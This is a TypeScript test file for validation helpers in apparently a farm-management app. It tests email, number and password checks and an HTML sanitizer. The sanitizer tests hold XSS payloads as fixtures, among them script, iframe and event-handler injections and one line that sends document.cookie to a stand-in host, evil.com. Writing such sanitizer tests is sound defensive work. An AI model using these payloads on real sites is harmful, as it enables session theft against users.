import { describe, expect, it } from 'bun:test';
import { ZodError } from 'zod';
import {
  formatValidationError,
  validatePositiveNumber,
  validateEmail,
  validatePasswordStrength,
  sanitizeInput
} from '../handlers/validation';

describe('formatValidationError', () => {
  it('should format positive number validation errors', () => {
    const zodError = new ZodError([
      {
        code: 'custom',
        message: 'Number must be positive',
        path: ['area_ha']
      }
    ]);

    const result = formatValidationError(zodError);
    expect(result).toBe('Enter a number greater than 0 for area_ha');
  });

  it('should format email validation errors', () => {
    const zodError = new ZodError([
      {
        code: 'invalid_string',
        validation: 'email',
        message: 'Invalid email',
        path: ['email']
      }
    ]);

    const result = formatValidationError(zodError);
    expect(result).toBe('Enter a valid email address');
  });

  it('should format required field errors', () => {
    const zodError = new ZodError([
      {
        code: 'invalid_type',
        expected: 'string',
        received: 'undefined',
        message: 'Required',
        path: ['name']
      }
    ]);

    const result = formatValidationError(zodError);
    expect(result).toBe('name is required');
  });

  it('should format integer validation errors', () => {
    const zodError = new ZodError([
      {
        code: 'custom',
        message: 'Value must be an integer',
        path: ['chicken_count']
      }
    ]);

    const result = formatValidationError(zodError);
    expect(result).toBe('chicken_count must be a whole number');
  });

  it('should format minimum length errors', () => {
    const zodError = new ZodError([
      {
        code: 'too_small',
        type: 'string',
        minimum: 6,
        inclusive: true,
        message: 'String must contain at least 6 character(s)',
        path: ['password']
      }
    ]);

    const result = formatValidationError(zodError);
    expect(result).toBe('password must be at least 6 characters');
  });

  it('should format enum validation errors', () => {
    const zodError = new ZodError([
      {
        code: 'invalid_enum_value',
        options: ['farming', 'livestock'],
        received: 'invalid',
        message: 'Invalid enum value. Expected "farming" | "livestock"',
        path: ['category']
      }
    ]);

    const result = formatValidationError(zodError);
    expect(result).toBe('Please select a valid option for category');
  });

  it('should handle empty error array', () => {
    const zodError = new ZodError([]);
    const result = formatValidationError(zodError);
    expect(result).toBe('Invalid input');
  });

  it('should handle errors without path', () => {
    const zodError = new ZodError([
      {
        code: 'custom',
        message: 'Required',
        path: []
      }
    ]);

    const result = formatValidationError(zodError);
    expect(result).toBe('This field is required');
  });

  it('should capitalize and return original message for unknown patterns', () => {
    const zodError = new ZodError([
      {
        code: 'custom',
        message: 'some custom validation message',
        path: ['field']
      }
    ]);

    const result = formatValidationError(zodError);
    expect(result).toBe('Some custom validation message');
  });
});

describe('validatePositiveNumber', () => {
  it('should validate positive numbers', () => {
    const result = validatePositiveNumber(10.5, 'area');
    expect(result).toBe(10.5);
    expect(typeof result).toBe('number');
  });

  it('should validate positive string numbers', () => {
    const result = validatePositiveNumber('25.75', 'weight');
    expect(result).toBe(25.75);
    expect(typeof result).toBe('number');
  });

  it('should validate integers', () => {
    const result = validatePositiveNumber(100, 'count');
    expect(result).toBe(100);
  });

  it('should trim and parse string numbers', () => {
    const result = validatePositiveNumber('  42.5  ', 'value');
    expect(result).toBe(42.5);
  });

  it('should reject zero', () => {
    expect(() => validatePositiveNumber(0, 'area')).toThrow('Enter a number greater than 0 for area');
  });

  it('should reject negative numbers', () => {
    expect(() => validatePositiveNumber(-5, 'weight')).toThrow('Enter a number greater than 0 for weight');
  });

  it('should reject NaN', () => {
    expect(() => validatePositiveNumber(NaN, 'count')).toThrow('Enter a valid number for count');
  });

  it('should reject infinity', () => {
    expect(() => validatePositiveNumber(Infinity, 'value')).toThrow('Enter a valid number for value');
  });

  it('should reject non-numeric strings', () => {
    expect(() => validatePositiveNumber('abc', 'area')).toThrow('Enter a valid number for area');
  });

  it('should reject null and undefined', () => {
    expect(() => validatePositiveNumber(null, 'weight')).toThrow('Enter a valid number for weight');
    expect(() => validatePositiveNumber(undefined, 'count')).toThrow('Enter a valid number for count');
  });

  it('should reject arrays and objects', () => {
    expect(() => validatePositiveNumber([1, 2, 3], 'value')).toThrow('Enter a valid number for value');
    expect(() => validatePositiveNumber({ num: 5 }, 'area')).toThrow('Enter a valid number for area');
  });

  it('should reject empty strings', () => {
    expect(() => validatePositiveNumber('', 'weight')).toThrow('Enter a valid number for weight');
    expect(() => validatePositiveNumber('   ', 'count')).toThrow('Enter a valid number for count');
  });
});

describe('validateEmail', () => {
  it('should validate correct email addresses', () => {
    const validEmails = [
      'test@example.com',
      'user.name@domain.org',
      'first.last+tag@sub.domain.co.uk',
      'a@b.co',
      'test123@test-domain.com'
    ];

    validEmails.forEach(email => {
      const result = validateEmail(email);
      expect(result).toBe(email.toLowerCase());
    });
  });

  it('should trim and lowercase email addresses', () => {
    const result = validateEmail('  Test@EXAMPLE.COM  ');
    expect(result).toBe('test@example.com');
  });

  it('should handle complex valid email formats', () => {
    const complexEmails = [
      'user+tag@example.com',
      'user.name+tag+sorting@example.com',
      'x@example.com',
      'example@s.example'
    ];

    complexEmails.forEach(email => {
      const result = validateEmail(email);
      expect(result).toBe(email.toLowerCase());
    });
  });

  it('should reject invalid email formats', () => {
    const invalidEmails = [
      'plainaddress',
      '@missingdomain.com',
      'missing@.com',
      'missing@domain',
      'spaces @domain.com',
      'user@',
      'user@domain.',
      '.user@domain.com',
      'user.@domain.com',
      'us..er@domain.com',
      'user@domain..com'
    ];

    invalidEmails.forEach(email => {
      expect(() => validateEmail(email)).toThrow('Enter a valid email address');
    });
  });

  it('should reject non-string inputs', () => {
    expect(() => validateEmail(123)).toThrow('Enter a valid email address');
    expect(() => validateEmail(null)).toThrow('Enter a valid email address');
    expect(() => validateEmail(undefined)).toThrow('Enter a valid email address');
    expect(() => validateEmail({})).toThrow('Enter a valid email address');
    expect(() => validateEmail([])).toThrow('Enter a valid email address');
  });

  it('should reject empty strings', () => {
    expect(() => validateEmail('')).toThrow('Email address is required');
    expect(() => validateEmail('   ')).toThrow('Email address is required');
  });

  it('should reject emails that are too long', () => {
    // Create an email longer than 254 characters
    const longEmail = 'a'.repeat(250) + '@example.com';
    expect(() => validateEmail(longEmail)).toThrow('Email address is too long');
  });

  it('should reject emails with local part too long', () => {
    // Create local part longer than 64 characters
    const longLocalPart = 'a'.repeat(65) + '@example.com';
    expect(() => validateEmail(longLocalPart)).toThrow('Email address is invalid');
  });
});

describe('validatePasswordStrength', () => {
  it('should validate strong passwords', () => {
    const strongPasswords = [
      'MyStr0ngP@ssw0rd',
      'AnotherGoodPassword123!',
      'ValidPass2024',
      'secure123'
    ];

    strongPasswords.forEach(password => {
      const result = validatePasswordStrength(password);
      expect(result).toBe(password);
    });
  });

  it('should accept minimum length passwords', () => {
    const result = validatePasswordStrength('validpass123');
    expect(result).toBe('validpass123');
  });

  it('should accept numeric passwords of sufficient length', () => {
    const result = validatePasswordStrength('123456');
    expect(result).toBe('123456');
  });

  it('should reject passwords that are too short', () => {
    const shortPasswords = ['12345', 'abc', 'a', ''];

    shortPasswords.forEach(password => {
      if (password === '') {
        expect(() => validatePasswordStrength(password)).toThrow('Password is required');
      } else {
        expect(() => validatePasswordStrength(password)).toThrow('Password must be at least 6 characters');
      }
    });
  });

  it('should reject non-string inputs', () => {
    expect(() => validatePasswordStrength(123456)).toThrow('Password must be text');
    expect(() => validatePasswordStrength(null)).toThrow('Password must be text');
    expect(() => validatePasswordStrength(undefined)).toThrow('Password must be text');
    expect(() => validatePasswordStrength({})).toThrow('Password must be text');
    expect(() => validatePasswordStrength([])).toThrow('Password must be text');
  });

  it('should reject empty password', () => {
    expect(() => validatePasswordStrength('')).toThrow('Password is required');
  });

  it('should reject extremely long passwords', () => {
    const longPassword = 'a'.repeat(129);
    expect(() => validatePasswordStrength(longPassword)).toThrow('Password is too long');
  });

  it('should reject common weak passwords', () => {
    const weakPasswords = ['password', 'qwerty', 'abc123'];

    weakPasswords.forEach(password => {
      expect(() => validatePasswordStrength(password)).toThrow(/too common/i);
    });
  });

  it('should reject common weak passwords regardless of case', () => {
    const weakPasswords = ['PASSWORD', 'Password', 'QWERTY', 'ABC123'];

    weakPasswords.forEach(password => {
      expect(() => validatePasswordStrength(password)).toThrow(/too common/i);
    });
  });
});

describe('sanitizeInput', () => {
  it('should HTML encode safe string inputs', () => {
    const testCases = [
      { input: 'Hello World', expected: 'Hello World' },
      { input: 'Simple text content', expected: 'Simple text content' },
      { input: 'Text with numbers 123', expected: 'Text with numbers 123' },
      { input: 'Text & symbols', expected: 'Text &amp; symbols' }
    ];

    testCases.forEach(({ input, expected }) => {
      const result = sanitizeInput(input);
      expect(result).toBe(expected);
    });
  });

  it('should remove script tags and content', () => {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '<script type="text/javascript">alert("hack")</script>',
      'Text before<script>alert("xss")</script>text after',
      '<SCRIPT>alert("case insensitive")</SCRIPT>'
    ];

    maliciousInputs.forEach(input => {
      const result = sanitizeInput(input);
      expect(result).not.toContain('script');
      expect(result).not.toContain('alert');
    });
  });

  it('should remove dangerous HTML tags', () => {
    const dangerousInputs = [
      '<iframe src="http://evil.com"></iframe>',
      '<object data="malware.swf"></object>',
      '<embed src="virus.exe">',
      '<link rel="stylesheet" href="http://evil.com/style.css">',
      '<meta http-equiv="refresh" content="0;url=http://evil.com">'
    ];

    dangerousInputs.forEach(input => {
      const result = sanitizeInput(input);
      expect(result).not.toMatch(/<(iframe|object|embed|link|meta)/i);
    });
  });

  it('should remove javascript and data URLs', () => {
    const urlInputs = [
      'javascript:alert("xss")',
      'JAVASCRIPT:alert("case")',
      'data:text/html,<script>alert("xss")</script>',
      'Some text javascript:void(0) more text'
    ];

    urlInputs.forEach(input => {
      const result = sanitizeInput(input);
      expect(result).not.toMatch(/javascript:/i);
      expect(result).not.toMatch(/data:/i);
    });
  });

  it('should remove event handlers', () => {
    const eventInputs = [
      '<div onclick="alert(\'xss\')">Click me</div>',
      '<img onload="alert(\'loaded\')" src="test.jpg">',
      '<span onmouseover="evil()">Hover</span>',
      'onsubmit="return false"'
    ];

    eventInputs.forEach(input => {
      const result = sanitizeInput(input);
      expect(result).not.toMatch(/\s*on\w+\s*=/i);
    });
  });

  it('should encode HTML entities', () => {
    const htmlInput = '<div class="test">Hello & "world" \'s content</div>';
    const result = sanitizeInput(htmlInput);
    
    expect(result).toContain('&lt;');
    expect(result).toContain('&gt;');
    expect(result).toContain('&amp;');
    expect(result).toContain('&quot;');
    expect(result).toContain('&#x27;');
  });

  it('should handle non-string inputs', () => {
    expect(sanitizeInput(null)).toBe('');
    expect(sanitizeInput(undefined)).toBe('');
    expect(sanitizeInput(123)).toBe('123');
    expect(sanitizeInput(true)).toBe('true');
    expect(sanitizeInput({})).toBe('[object Object]');
  });

  it('should trim whitespace', () => {
    const result = sanitizeInput('   Hello World   ');
    expect(result).toBe('Hello World');
  });

  it('should handle empty strings', () => {
    expect(sanitizeInput('')).toBe('');
    expect(sanitizeInput('   ')).toBe('');
  });

  it('should handle complex XSS attempts', () => {
    const complexXSS = `
      <img src=x onerror="alert('XSS')">
      <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
      javascript:void(0)
      <iframe src="javascript:alert('XSS')"></iframe>
    `;
    
    const result = sanitizeInput(complexXSS);
    
    expect(result).not.toContain('<script');
    expect(result).not.toContain('<iframe');
    expect(result).not.toContain('onerror');
    expect(result).not.toContain('javascript:');
    expect(result).not.toContain('alert');
  });
});